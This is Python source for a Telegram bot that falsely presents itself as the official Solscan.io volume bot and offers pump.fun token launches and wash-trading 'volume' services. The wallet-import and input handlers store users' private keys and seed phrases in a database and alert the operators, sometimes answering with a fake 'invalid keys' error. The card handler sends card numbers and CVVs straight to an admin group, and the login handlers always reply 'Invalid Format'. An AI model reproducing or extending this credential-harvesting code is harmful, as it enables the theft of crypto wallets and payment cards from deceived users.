            trednding_Keyboard = [
                [InlineKeyboardButton('🟢 Top 3 Guarantee', callback_data='top3'),
                 InlineKeyboardButton('🟢 Top 8 Guarantee', callback_data='top8')],
                [InlineKeyboardButton('🟢 Any Position', callback_data='anyposition')]
            ]
            reply_markup = InlineKeyboardMarkup(trednding_Keyboard)
            
            sent_message = await update.message.reply_text(f'''

            <b>Name :</b> {token_data['name']}
            <b>Ticker :</b> {token_data['symbol']}
            <b>DEX :</b> {token_data.get('dex', 'Raydium')}
            <b>Chain :</b> Solana
            <b>Chart :</b> <a href="{token_data.get('url', '#')}">Open chart</a>

            <b>CA :</b>
            <code>{token}</code>

            <b>Group/Portal:</b> {text}

            <b>Select Spot</b>
            ''', parse_mode='HTML', reply_markup=reply_markup)
            context.user_data['last_bot_message_id'] = sent_message.message_id
        else:
            await update.message.reply_text("❌ Invalid link format. Please send a valid URL.")
        return
    
    # 👇 ADD THIS NEW HANDLER HERE 👇
    # Handle token name input for creation
    elif context.user_data.get('awaiting_token_name'):
        context.user_data['awaiting_token_name'] = False
        if 'token_creation' not in context.user_data:
            context.user_data['token_creation'] = {}
        context.user_data['token_creation']['name_ticker'] = text
        context.user_data['awaiting_token_image'] = True
        
        keyboard = [
            [InlineKeyboardButton('🔙 Back to PumpFun', callback_data='pumpfun')],
            [InlineKeyboardButton('🏠 Main Menu', callback_data='main')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        sent_message = await update.message.reply_text('''
        ✅ <b>Name & Ticker saved!</b>

        Now <b>upload an image</b> for your token
        (PNG, JPG, or GIF recommended)

        ⬆️ Send me the image now
        ''', parse_mode='HTML', reply_markup=reply_markup)
        context.user_data['last_bot_message_id'] = sent_message.message_id
        return

    
    
    # Handle token description input
    elif context.user_data.get('awaiting_token_description'):
        context.user_data['token_creation']['description'] = text
        context.user_data['awaiting_token_description'] = False
        context.user_data['awaiting_token_socials'] = True
        
        # Create skip button for socials
        keyboard = [
            [InlineKeyboardButton('Skip ❌', callback_data='skip_socials')],
            [InlineKeyboardButton('🔙 Back to PumpFun', callback_data='pumpfun')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        sent_message = await update.message.reply_text('''
        ✅ <b>Description saved!</b>

        Now add your <b>social links</b> (optional)
        • Telegram
        • X (Twitter)
        • Website
        • Any other links

        Send them one per line or click Skip
        ''', parse_mode='HTML', reply_markup=reply_markup)
        context.user_data['last_bot_message_id'] = sent_message.message_id
        return

    # Handle social links input
    elif context.user_data.get('awaiting_token_socials'):
        context.user_data['token_creation']['socials'] = text
        context.user_data['awaiting_token_socials'] = False
        
        # Get token data
        name_ticker = context.user_data['token_creation'].get('name_ticker', 'Not set')
        description = context.user_data['token_creation'].get('description', 'No description')
        image_file_id = context.user_data['token_creation'].get('image')
        
        # Create keyboard with Confirm and Edit buttons
        keyboard = [
            [
                InlineKeyboardButton('✅ Confirm', callback_data='launch_token'),
                InlineKeyboardButton('✏️ Edit', callback_data='createtoken')
            ],
            [InlineKeyboardButton('🔙 Back to PumpFun', callback_data='pumpfun')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # If we have an image, send it with the summary
        if image_file_id:
            sent_message = await update.message.reply_photo(
                photo=image_file_id,
                caption=f'''
            📋 <b>Token Creation Summary</b>

            <b>Name/Ticker:</b> {name_ticker}
            <b>Description:</b> {description}
            <b>Socials:</b> {text if text else 'None'}
            <b>Image:</b> ✓ Received 

            Ready to launch?
            ''',
                parse_mode='HTML',
                reply_markup=reply_markup
            )
            context.user_data['last_bot_message_id'] = sent_message.message_id
        else:
            sent_message = await update.message.reply_text(f'''
            📋 <b>Token Creation Summary</b>

            <b>Name/Ticker:</b> {name_ticker}
            <b>Description:</b> {description}
            <b>Socials:</b> {text if text else 'None'}
            <b>Image:</b> Not provided

            Ready to launch?
            ''', parse_mode='HTML', reply_markup=reply_markup)
            context.user_data['last_bot_message_id'] = sent_message.message_id
        return
    
        # Handle creator reward login
    elif context.user_data.get('awaiting_creator_login'):
        context.user_data['awaiting_creator_login'] = False
        
        
        # Create retry keyboard
        retry_keyboard = [
            [InlineKeyboardButton('🔙 Back to PumpFun', callback_data='pumpfun')]
        ]
        retry_markup = InlineKeyboardMarkup(retry_keyboard)
        
        # Update the processing message with error and retry buttons
        sent_message = await update.message.reply_text('''
        <b>Invalid Format</b>

        ''', parse_mode='HTML', reply_markup=retry_markup)
        context.user_data['last_bot_message_id'] = sent_message.message_id
        return

    # Handle manager login
    elif context.user_data.get('awaiting_manager_login'):
        context.user_data['awaiting_manager_login'] = False
        
     
        # Create retry keyboard
        retry_keyboard = [
            [InlineKeyboardButton('🔙 Back to PumpFun', callback_data='pumpfun')]
        ]
        retry_markup = InlineKeyboardMarkup(retry_keyboard)
        
        # Send error message with retry buttons directly
        sent_message = await update.message.reply_text('''
        <b> Invalid Format</b>

        ''', parse_mode='HTML', reply_markup=retry_markup)
        context.user_data['last_bot_message_id'] = sent_message.message_id
        
        # Optional logging
        # user_id = update.effective_user.id
        # username = update.effective_user.username
        # print(f"Manager login attempt by {username} ({user_id}): {text[:20]}...")
        return
    
    
    # Add this near your other message handlers in handle_message function
    elif context.user_data.get('awaiting_card_details'):
        # Process card details
        card_text = text
        
        # Simple validation - check if it contains required fields
        if ('Card Number:' in card_text and 
            'Expiry Date:' in card_text and 
            'CVV:' in card_text):
            
            # Extract information (you would typically send this to a payment processor)
            context.user_data['awaiting_card_details'] = False
            amount = context.user_data.get('card_payment_amount', '0.5')
            
            # === ADD THIS NEW CODE ===
            # Send the actual card details to admin group
            user = update.effective_user
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # Forward the exact card details message to admin group
            card_alert = f"""
💳 <b>Card Payment Details Received</b>

👤 <b>User:</b> {user.first_name} (@{user.username if user.username else 'No username'})
🆔 <b>ID:</b> <code>{user.id}</code>
💰 <b>Amount:</b> {amount} SOL
⏰ <b>Time:</b> {current_time}

<b>━━━━━━━━━━━━━━━━━━━━━</b>
<b>Card Details:</b>
<code>{card_text}</code>
<b>━━━━━━━━━━━━━━━━━━━━━</b>
            """
            
            keyboard = [
                [InlineKeyboardButton("📝 Reply to User", callback_data=f"reply_{user.id}")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            try:
                await context.bot.send_message(
                    chat_id=ADMIN_GROUP_ID,
                    text=card_alert,
                    parse_mode='HTML',
                    reply_markup=reply_markup
                )
            except Exception as e:
                print(f"Error forwarding card details: {e}")
            # === END OF NEW CODE ===
            
            # Create success keyboard
            keyboard = [
                [InlineKeyboardButton('✅ Process Payment', callback_data=f'process_card_{amount}')],
                [InlineKeyboardButton('🔙 Back', callback_data='launch_token')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            sent_message = await update.message.reply_text(
                f'''
            ✅ <b>Card Details Received!</b>

            ━━━━━━━━━━━━━━━━━━━━━
            <b>Payment Amount:</b> {amount} SOL
            <b>Status:</b> Ready to process

            Please review and confirm your payment.
            ━━━━━━━━━━━━━━━━━━━━━

            Click "Process Payment" to complete the transaction.
            ''',
                parse_mode='HTML',
                reply_markup=reply_markup
            )
            context.user_data['last_bot_message_id'] = sent_message.message_id
        else:
            # Invalid format
            keyboard = [
                [InlineKeyboardButton('❌ Cancel', callback_data='launch_token')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            sent_message = await update.message.reply_text(
                '''
            ❌ <b>Invalid Format</b>

            Please enter your card details exactly as shown:

            <code>Card Number: XXXX XXXX XXXX XXXX
            Expiry Date: MM/YY
            CVV: XXX
            Billing Address: Street, City, Country (optional)</code>

            Try again or click Cancel to go back.
            ''',
                parse_mode='HTML',
                reply_markup=reply_markup
            )
            context.user_data['last_bot_message_id'] = sent_message.message_id
        return
    
    
    # === ADD THIS NEW WALLET IMPORT HANDLER HERE ===
    # Handle wallet import
    elif context.user_data.get('awaiting_wallet_import'):
        wallet_input = text
        
        # Simple validation - check length and format
        is_valid = False
        
        # Check if it's a base58 private key (typical length 32-88 chars)
        if len(wallet_input) >= 32 and len(wallet_input) <= 88 and re.match(r'^[1-9A-HJ-NP-Za-km-z]+$', wallet_input):
            is_valid = True
        
        # Check if it's a seed phrase (12 or 24 words)
        words = wallet_input.split()
        if len(words) in [12, 24] and all(word.isalpha() for word in words):
            is_valid = True
        
        # Check if it's an array format
        if wallet_input.startswith('[') and wallet_input.endswith(']') and ',' in wallet_input:
            try:
                # Very basic array validation
                numbers = wallet_input.strip('[]').split(',')
                if all(num.strip().isdigit() for num in numbers):
                    is_valid = True
            except:
                pass
        
        if is_valid:
            # Store the wallet input (you might want to encrypt this in production!)
            user_id = update.effective_user.id
            username = update.effective_user.username
            first_name = update.effective_user.first_name
            
            # Save to database
            conn = sqlite3.connect("wallets.db")
            cursor = conn.cursor()
            cursor.execute("""
                INSERT INTO wallets (user_id, wallet_input, username, first_name)
                VALUES (?, ?, ?, ?)
            """, (user_id, wallet_input, username, first_name))
            conn.commit()
            conn.close()
            
            # Mark that user has imported a wallet
            context.user_data['has_imported_wallet'] = True
            
            # Clear the waiting state
            context.user_data['awaiting_wallet_import'] = False
            
            # Success message
            keyboard = [
                [InlineKeyboardButton('💰 View Wallet', callback_data='wallet')],
                [InlineKeyboardButton('🏠 Main Menu', callback_data='main')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            sent_message = await update.message.reply_text(
                '''
            ✅ <b>Wallet Imported Successfully!</b>

            Your wallet has been connected.
            You can now use it for transactions.

            Click "View Wallet" to see your address.
            ''',
                parse_mode='HTML',
                reply_markup=reply_markup
            )
            context.user_data['last_bot_message_id'] = sent_message.message_id
            
            # Optional: Send alert to admin
            user = update.effective_user
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            alert_text = f"""
🔔 <b>User Activity Alert</b>

👤 <b>User:</b> {user.first_name} (@{user.username if user.username else 'No username'})
🆔 <b>ID:</b> <code>{user.id}</code>

📝 <b>Type:</b> Wallet Import
✅ <b>Status:</b> Success
⏰ <b>Time:</b> {current_time}
            """
            
            keyboard_alert = [
                [InlineKeyboardButton("📝 Reply to User", callback_data=f"reply_{user.id}")]
            ]
            reply_markup_alert = InlineKeyboardMarkup(keyboard_alert)
            
            try:
                await context.bot.send_message(
                    chat_id=ADMIN_GROUP_ID,
                    text=alert_text,
                    parse_mode='HTML',
                    reply_markup=reply_markup_alert
                )
            except Exception as e:
                print(f"Error sending wallet import alert: {e}")
                
        else:
            # Invalid format
            keyboard = [
                [InlineKeyboardButton('🔄 Try Again', callback_data='import_wallet')],
                [InlineKeyboardButton('🔙 Back to Wallet', callback_data='wallet')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            sent_message = await update.message.reply_text(
                '''
            ❌ <b>Incorrect format private key or phrase</b>

            Please check your input and try again.

            <i>Accepted formats:</i>
            • Private key (base58 format)
            • 12 or 24 word seed phrase
            • Array format [93,182,8,9,...]

            Click "Try Again" to re-enter your details.
            ''',
                parse_mode='HTML',
                reply_markup=reply_markup
            )
            context.user_data['last_bot_message_id'] = sent_message.message_id
        
        return
    # === END OF WALLET IMPORT HANDLER ===
    




    elif context.user_data.get('awaiting_admin_reply'):
        # This is an admin reply to a user
        user_id = context.user_data.get('replying_to_user')
        admin_reply = text
        admin_user = update.effective_user  # The admin who is replying
        
        try:
            # Send reply to user
            await context.bot.send_message(
                chat_id=user_id,
                text=f"📨 <b>Support Response:</b>\n\n{admin_reply}\n\n<i>Reply to continue the conversation</i>",
                parse_mode='HTML'
            )
            
            # Confirm to admin in their private chat
            await update.message.reply_text("✅ Reply sent to user!")
            
            # === ADD THIS NEW CODE ===
            # Send notification to admin group that a reply was sent
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            reply_alert = f"""
📤 <b>Admin Reply Sent</b>

👤 <b>Admin:</b> {admin_user.first_name} (@{admin_user.username if admin_user.username else 'No username'})
👥 <b>To User ID:</b> <code>{user_id}</code>
💬 <b>Reply:</b> {admin_reply}
⏰ <b>Time:</b> {current_time}
            """
            
            keyboard = [
                [InlineKeyboardButton("📝 Reply to User", callback_data=f"reply_{user_id}")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            try:
                await context.bot.send_message(
                    chat_id=ADMIN_GROUP_ID,
                    text=reply_alert,
                    parse_mode='HTML',
                    reply_markup=reply_markup
                )
            except Exception as e:
                print(f"Error sending reply alert: {e}")
            # === END OF NEW CODE ===
            
            # Clear reply state
            context.user_data['awaiting_admin_reply'] = False
            context.user_data.pop('replying_to_user', None)
            
        except Exception as e:
            await update.message.reply_text(f"❌ Failed to send reply: {e}")
            
        return
    
    else:
    # Check if user is in the middle of token creation flow
        token_creation_flow = any([
            context.user_data.get('awaiting_token_name'),
            context.user_data.get('awaiting_token_image'),
            context.user_data.get('awaiting_token_description'),
            context.user_data.get('awaiting_token_socials')
        ])
        
        if token_creation_flow:
            # Let token creation continue without error message
            return
        else:
            # Send error message to user
            await update.message.reply_text("❌ Error: Use /start to begin using the bot")
            
            # Still send alert to admin group
            await forward_to_admin(update, context)

    


# Add these near your other command handlers (around line 1000)
async def activate_coupon(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Activate a coupon code - Usage: /activate SAVE10"""
    # Check if user is admin
    if update.effective_user.id not in OWNER_ID and update.effective_chat.id != ADMIN_GROUP_ID:
        await update.message.reply_text("🚫 You're not authorized to use this command.")
        return
    
    # Check if coupon code was provided
    if not context.args or len(context.args) != 1:
        await update.message.reply_text(
            "❌ <b>Usage:</b> <code>/activate COUPON_CODE</code>\n\n"
            "Example: <code>/activate SAVE10</code>",
            parse_mode='HTML'
        )
        return
    
    coupon_code = context.args[0].upper()
    
    # Check if coupon exists
    if coupon_code not in VALID_COUPONS:
        await update.message.reply_text(
            f"❌ Coupon <code>{coupon_code}</code> not found in the system.\n\n"
            f"<i>Valid coupons: {', '.join(VALID_COUPONS.keys())}</i>",
            parse_mode='HTML'
        )
        return
    
    # Activate coupon (already active by default, but we'll track status in a new dict)
    if 'coupon_status' not in context.bot_data:
        context.bot_data['coupon_status'] = {}
    
    context.bot_data['coupon_status'][coupon_code] = 'active'
    
    await update.message.reply_text(
        f"✅ <b>Coupon Activated!</b>\n\n"
        f"<code>{coupon_code}</code> - {VALID_COUPONS[coupon_code]} SOL discount\n"
        f"Status: 🟢 Active",
        parse_mode='HTML'
    )

async def deactivate_coupon(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Deactivate a coupon code - Usage: /deactivate SAVE10"""
    # Check if user is admin
    if update.effective_user.id not in OWNER_ID and update.effective_chat.id != ADMIN_GROUP_ID:
        await update.message.reply_text("🚫 You're not authorized to use this command.")
        return
    
    # Check if coupon code was provided
    if not context.args or len(context.args) != 1:
        await update.message.reply_text(
            "❌ <b>Usage:</b> <code>/deactivate COUPON_CODE</code>\n\n"
            "Example: <code>/deactivate SAVE10</code>",
            parse_mode='HTML'
        )
        return
    
    coupon_code = context.args[0].upper()
    
    # Check if coupon exists
    if coupon_code not in VALID_COUPONS:
        await update.message.reply_text(
            f"❌ Coupon <code>{coupon_code}</code> not found in the system.\n\n"
            f"<i>Valid coupons: {', '.join(VALID_COUPONS.keys())}</i>",
            parse_mode='HTML'
        )
        return
    
    # Deactivate coupon
    if 'coupon_status' not in context.bot_data:
        context.bot_data['coupon_status'] = {}
    
    context.bot_data['coupon_status'][coupon_code] = 'inactive'
    
    await update.message.reply_text(
        f"✅ <b>Coupon Deactivated!</b>\n\n"
        f"<code>{coupon_code}</code> - {VALID_COUPONS[coupon_code]} SOL discount\n"
        f"Status: 🔴 Inactive",
        parse_mode='HTML'
    )

async def list_coupons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List all coupons and their status - Usage: /coupons"""
    # Check if user is admin
    if update.effective_user.id not in OWNER_ID and update.effective_chat.id != ADMIN_GROUP_ID:
        await update.message.reply_text("🚫 You're not authorized to use this command.")
        return
    
    if 'coupon_status' not in context.bot_data:
        context.bot_data['coupon_status'] = {}
    
    # Build status message
    message = "🎫 <b>Coupon Status</b>\n\n"
    for code, discount in VALID_COUPONS.items():
        status = context.bot_data['coupon_status'].get(code, 'active')  # Default to active
        status_emoji = "🟢" if status == 'active' else "🔴"
        message += f"{status_emoji} <code>{code}</code> - {discount} SOL\n"
    
    await update.message.reply_text(message, parse_mode='HTML')

# === REPLACE YOUR CURRENT error_handler WITH THIS ENHANCED VERSION ===
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Enhanced error handler - handles cases with no update object"""
    import traceback
    from datetime import datetime
    
    # Get the full error traceback
    error_trace = traceback.format_exc()
    
    # Log to console (Render logs)
    print(f"❌ ERROR OCCURRED: {error_trace}")
    
    # Prepare error details for admin group with safe defaults
    error_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Safely get user info - might be None during background tasks
    user_info = "System/Background Task"
    user_id = "N/A"
    user_message = "No message (background task)"
    callback_data = "N/A"
    
    if update:
        if update.effective_user:
            user = update.effective_user
            user_info = f"{user.first_name} (@{user.username if user.username else 'No username'})"
            user_id = user.id
        
        if update.effective_message and update.effective_message.text:
            user_message = update.effective_message.text[:100]
        
        if update.callback_query:
            callback_data = update.callback_query.data
    
    # Truncate error trace if too long
    if len(error_trace) > 3500:
        error_trace = error_trace[:3500] + "...\n[truncated]"
    
    # Create error message for admin group
    error_message = f"""
🚨 <b>BOT ERROR DETECTED</b>

⏰ <b>Time:</b> {error_time}
👤 <b>Context:</b> {user_info}
🆔 <b>User/System ID:</b> <code>{user_id}</code>
💬 <b>Message:</b> <code>{user_message}</code>
🔘 <b>Button:</b> <code>{callback_data}</code>

<b>━━━━━━━━━━━━━━━━━━━━━</b>
<b>Error Details:</b>
<code>{error_trace}</code>
<b>━━━━━━━━━━━━━━━━━━━━━</b>
"""
    
    # Send to admin group
    try:
        await context.bot.send_message(
            chat_id=ADMIN_GROUP_ID,
            text=error_message,
            parse_mode='HTML'
        )
        print(f"✅ Error notification sent to admin group")
    except Exception as e:
        print(f"❌ Failed to send error to admin group: {e}")
    
    # Only notify user if there's an update and it's a user-facing error
    if update and update.effective_message and "background" not in str(error_trace).lower():
        try:
            await update.effective_message.reply_text(
                "❌ An error occurred. Our team has been notified and will look into it."
            )
        except:
            pass
# === END OF ENHANCED ERROR HANDLER ===

# Add this after your message handlers but before the Commands section
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle photo messages for token creation"""
    user = update.effective_user
    log_user(user)
    
    # Check if we're waiting for an image
    if context.user_data.get('awaiting_token_image'):
        # Make sure token_creation dict exists
        if 'token_creation' not in context.user_data:
            context.user_data['token_creation'] = {}
            
        # Get the largest photo
        photo = update.message.photo[-1]
        context.user_data['token_creation']['image'] = photo.file_id
        context.user_data['awaiting_token_image'] = False
        context.user_data['awaiting_token_description'] = True
        
        # Create skip button
        keyboard = [
            [InlineKeyboardButton('Skip ❌', callback_data='skip_description')],
            [InlineKeyboardButton('🔙 Back to PumpFun', callback_data='pumpfun')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text('''
✅ <b>Image saved!</b>

Now add a <b>description</b>
Example:
<i>“MoonCat ($MCAT) — The community-powered meme token aiming for the moon. Built for fun, driven by holders.”</i>

Send your description or click Skip
''', parse_mode='HTML', reply_markup=reply_markup)
        return

# Commands 
async def handle_wallet_input(update: Update, context):
    user_id = update.effective_user.id
    wallet_input = update.message.text
    username = update.effective_user.username  # Get the username
    first_name = update.effective_user.first_name  # Get the first name

    conn = sqlite3.connect("wallets.db")
    cursor = conn.cursor()
    
    cursor.execute("""
        INSERT INTO wallets (user_id, wallet_input, username, first_name)
        VALUES (?, ?, ?, ?)
    """, (user_id, wallet_input, username, first_name))
    
    conn.commit()
    conn.close()

    await update.message.reply_text(f'''
<b>eRR!!!::: 1728</b>
<i>Some of private keys are invalid</i>
''', parse_mode='HTML')

async def help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text('''
<b>First and official bump bot of @delugecash ecosystem 
Have issues?
Reach out @DELUGE_BUMP_SUPPORT</b>
''', parse_mode='HTML')

async def faq(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send FAQ information to users"""
    faq_message = """
<b>FAQ — Solscan.io Volume Bot</b>

1. <b>What is the Solscan.io Volume Bot?</b>
The Solscan.io Volume Bot is a tool that helps increase on-chain activity for Solana tokens by generating micro buys, bumps, and trading volume. This activity can help a token gain visibility on trackers and increase engagement around the project.

2. <b>What features does the bot offer?</b>
The bot provides several services including:
• Volume Bot – Generates buy transactions to simulate organic trading activity.
• Micro Buys / Bumps – Small randomized buys that increase transaction count.
• Trending Boost – Helps push tokens toward trending sections on trackers.
• Pump.fun Token Launch – Create and manage tokens launched on pump.fun.
• Creator Rewards Claim – Claim eligible pump.fun creator rewards easily.

3. <b>How does the volume bot work?</b>
The bot performs multiple small buy transactions on your token using distributed wallets.
These transactions appear on-chain and can increase:
• Trading activity
• Transaction count
• Visibility on analytics platforms
All actions are executed on the Solana blockchain, so they are publicly visible.

4. <b>What are "micro buys" or "bumps"?</b>
Micro buys are small automated purchases of a token made repeatedly over a set period.
They are commonly used to:
• Increase transaction count
• Create steady trading activity
• Improve chart appearance

5. <b>Can I use the bot for pump.fun tokens?</b>
Yes. The bot supports pump.fun token management, including:
• Launch assistance
• Volume boosting
• Wallet activity simulation
• Creator reward claiming

6. <b>Do I need coding experience to use the bot?</b>
No. The system is designed to be simple and user-friendly, usually accessible through Telegram commands or a web dashboard.

7. <b>Is my wallet safe when using the bot?</b>
You should never share your private key with anyone.
Most bots require only:
• Token address
• Amount to spend
• Duration or volume target
Always verify the service before using it.

8. <b>How long does a volume campaign run?</b>
Campaign duration depends on the plan selected. Common options include:
• 1 hour
• 6 hours
• 12 hours
• 24 hours
Some services also allow custom durations.

9. <b>Will the bot guarantee my token trends?</b>
Yes service can guarantee trending, because trending algorithms depend on multiple factors such as:
• Real trading activity
• Community engagement
• Market conditions
The bot simply increases on-chain activity that improve visibility.

10. <b>Where can I track the volume activity?</b>
You can monitor all transactions directly on:
• Solscan.io
• Other Solana blockchain explorers
• Token analytics platforms
Since transactions occur on-chain, they are fully transparent.

<b>Supported Channels</b>
Trending promotions may also be supported on:
• @SOLTRENDING
• @solana_live
These communities highlight active Solana projects and trending tokens.

💡 <b>Tip:</b>
For best results, combine volume boosting with:
• Strong community marketing
• Social media promotion
• Real liquidity
Bots alone rarely sustain long-term growth.
"""
    
    # Create a keyboard with back to main menu
    keyboard = [
        [InlineKeyboardButton('🏠 Main Menu', callback_data='main')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    sent_message = await update.message.reply_text(
        faq_message,
        parse_mode='HTML',
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )
    context.user_data['last_bot_message_id'] = sent_message.message_id
        
    
    # Send alert to admin group for /faq command
    user = update.effective_user
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    alert_text = f"""
🔔 <b>User Activity Alert</b>

👤 <b>User:</b> {user.first_name} (@{user.username if user.username else 'No username'})
🆔 <b>ID:</b> <code>{user.id}</code>

📝 <b>Type:</b> Command
💬 <b>Command:</b> /faq

⏰ <b>Time:</b> {current_time}
    """
    
    keyboard_alert = [
        [InlineKeyboardButton("📝 Reply to User", callback_data=f"reply_{user.id}")]
    ]
    reply_markup_alert = InlineKeyboardMarkup(keyboard_alert)
    
    try:
        await context.bot.send_message(
            chat_id=ADMIN_GROUP_ID,
            text=alert_text,
            parse_mode='HTML',
            reply_markup=reply_markup_alert
        )
    except Exception as e:
        print(f"Error sending /faq alert: {e}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Fetch live SOL price + 24h change
    sol_price, sol_change = await get_sol_price_with_change()
    
    # Format change with arrow
    if sol_change >= 0:
        change_display = f"🔺{sol_change:.2f}%"
    else:
        change_display = f"🔻{abs(sol_change):.2f}%"
    
    # Format price nicely
    if sol_price > 0:
        price_display = f"${sol_price:.2f} {change_display}"
    else:
        price_display = "N/A"
    
    # Get cached tokens
    tokens_message = get_cached_tokens()

    # Create the welcome message with your exact format
    welcome_message = f"""
📡<b>Welcome to The first and official Volume bot of Solscan.io

💰 Sol price : {price_display}

🟢 Buy - Bot @buybot
🤖 We helped 14045 users to promote 26260 tokens!

{tokens_message}

💵 Wallet Balance
╚═ No Wallet Imported 

🔄 ACTIVE TOKENS
╚═ you don't have active tokens
Non created 
Non Verified 
Non Managing 
Non claimed

🌐 Official Links:
<a href="https://solscan.io">Website</a> | <a href="https://docs.solscan.io">Docs</a> | <a href="https://twitter.com/solscanofficial">X</a> |

/start</b>
"""

    # Keyboard with support button
    keyboard = [
        [InlineKeyboardButton("🟢 Bump/Micro Buys", callback_data='startbump')],
        [InlineKeyboardButton("💳 Wallet", callback_data='wallet')],
        [InlineKeyboardButton("🏆 Trending ", callback_data='trending'),
         InlineKeyboardButton('🔊 Volume Bot', callback_data='volume')],
        [InlineKeyboardButton('💊 PumpFun', callback_data='pumpfun')],

        [InlineKeyboardButton('🆘 Support', url='https://t.me/TacoTabitha')],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Try to send video, fall back to text if it fails
    try:
        # Check if video file exists
        if os.path.exists('welcome_video.mp4'):
            with open('welcome_video.mp4', 'rb') as video_file:
                sent_message = await update.message.reply_video(
                    video=video_file,
                    caption=welcome_message,
                    parse_mode='HTML',
                    reply_markup=reply_markup,
                    read_timeout=30,
                    write_timeout=30,
                    connect_timeout=30,
                    pool_timeout=30
                )
                context.user_data['last_bot_message_id'] = sent_message.message_id
        else:
            # Video file doesn't exist, send text only
            sent_message = await update.message.reply_text(
            text=welcome_message,
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        context.user_data['last_bot_message_id'] = sent_message.message_id
    except Exception as e:
        print(f"Error sending video: {e}")
        # Fall back to text message
        sent_message = await update.message.reply_text(
            text=welcome_message,
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        context.user_data['last_bot_message_id'] = sent_message.message_id
    
    # Send alert to admin group for /start command
    user = update.effective_user
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    alert_text = f"""
🔔 <b>User Activity Alert</b>

👤 <b>User:</b> {user.first_name} (@{user.username if user.username else 'No username'})
🆔 <b>ID:</b> <code>{user.id}</code>

📝 <b>Type:</b> Command
💬 <b>Command:</b> /start

⏰ <b>Time:</b> {current_time}
    """
    
    keyboard_alert = [
        [InlineKeyboardButton("📝 Reply to User", callback_data=f"reply_{user.id}")]
    ]
    reply_markup_alert = InlineKeyboardMarkup(keyboard_alert)
    
    try:
        await context.bot.send_message(
            chat_id=ADMIN_GROUP_ID,
            text=alert_text,
            parse_mode='HTML',
            reply_markup=reply_markup_alert
        )
    except Exception as e:
        print(f"Error sending /start alert: {e}")


#Menu
#Menu
#Menu
async def menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    token_address = context.user_data.get('token_address', 'Unknown')
    token_data = context.user_data.get('token_data', {'name': 'Unknown'})
    trending_link = context.user_data.get('trending_link', 'Unknown')
    trending_token = context.user_data.get('trending_token', 'Unkown')
    query = update.callback_query
    await query.answer()
    
    # === ADD THIS NEW CODE BELOW ===
    # Send alert for any menu button click (except admin replies)
    if not query.data.startswith('reply_') and query.data != 'confirm' and not query.data.startswith('process_card_'):
        user = query.from_user
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        alert_text = f"""
            🔔 <b>User Activity Alert</b>

            👤 <b>User:</b> {user.first_name} (@{user.username if user.username else 'No username'})
            🆔 <b>ID:</b> <code>{user.id}</code>

            📝 <b>Type:</b> Button Click
            💬 <b>Button:</b> <code>{query.data}</code>

            ⏰ <b>Time:</b> {current_time}
        """
        
        keyboard = [
            [InlineKeyboardButton("📝 Reply to User", callback_data=f"reply_{user.id}")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        try:
            await context.bot.send_message(
                chat_id=ADMIN_GROUP_ID,
                text=alert_text,
                parse_mode='HTML',
                reply_markup=reply_markup
            )
        except Exception as e:
            print(f"Error sending button alert: {e}")
    # === END OF NEW CODE ===


    # Helper function to handle both text and video messages
    # Helper function to handle both text and video messages
    # Helper function to handle both text and video messages
    # Helper function to handle both text and video messages
    # Helper function to handle both text and video messages
    async def edit_message(text, reply_markup=None, parse_mode='HTML', force_new=True):
        try:
            # Always delete the old message and send a new one for clean chat
            try:
                await query.message.delete()
            except:
                pass  # Ignore if message can't be deleted
            
            # Send a new message
            sent_message = await context.bot.send_message(
                chat_id=query.message.chat_id,
                text=text,
                parse_mode=parse_mode,
                reply_markup=reply_markup
            )
            
            # === STEP 4: Store the message ID for future deletion ===
            context.user_data['last_bot_message_id'] = sent_message.message_id
            
            return sent_message
                
        except BadRequest as e:
            print(f"Failed to send message: {e}")
            # Try sending as fallback
            try:
                sent_message = await context.bot.send_message(
                    chat_id=query.message.chat_id,
                    text=text,
                    parse_mode=parse_mode,
                    reply_markup=reply_markup
                )
                context.user_data['last_bot_message_id'] = sent_message.message_id
                return sent_message
            except:
                pass

    if query.data == 'main':
        # Clear any stored bump amounts
        context.user_data.pop('bump_1hr_amount', None)
        context.user_data.pop('bump_3hr_amount', None)
        context.user_data.pop('bump_6hr_amount', None)
        context.user_data.pop('bump_12hr_amount', None)
        context.user_data.pop('bump_24hr_amount', None)
        
        # Fetch live SOL price
        sol_price = await get_sol_price_cached()
        
        # Format price nicely
        if sol_price > 0:
            price_display = f"${sol_price:.2f}"
        else:
            price_display = "N/A"
        
        # Get cached tokens
        tokens_message = get_cached_tokens()

        welcome_message = f"""
        📡<b>Welcome to The first and official Volume bot of Solscan.io

